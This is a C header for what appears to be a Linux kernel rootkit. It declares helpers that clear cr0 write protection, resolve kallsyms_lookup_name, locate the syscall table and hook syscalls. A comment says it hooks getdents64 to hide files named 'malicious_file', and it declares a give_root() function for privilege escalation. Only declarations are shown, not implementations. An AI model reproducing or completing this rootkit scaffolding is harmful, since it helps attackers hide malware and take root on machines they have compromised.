void cr0_write(unsigned long val);
unsigned long unprotect_memory(void);
void protect_memory(unsigned long val);
void get_kallsyms_funcptr(void);
void get_syscall_table(void);


// Pointer to syscall table
extern unsigned long *syscall_table;
// cr0 status
extern unsigned long cr0;
// Function pointer for read
typedef int (*sysfun_t)(struct pt_regs *);

// Function pointer for kallsyms_lookup_name
typedef void *(*kallsyms_t)(const char *);
extern kallsyms_t lookup_name;

/* 
	for getdents()
	hooks the getdents64 syscall using the syscall table 
	modification method to hide files named "malicious_file"(MAGIC_PREFIX)
*/

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

// Funny function :)
void give_root(void);

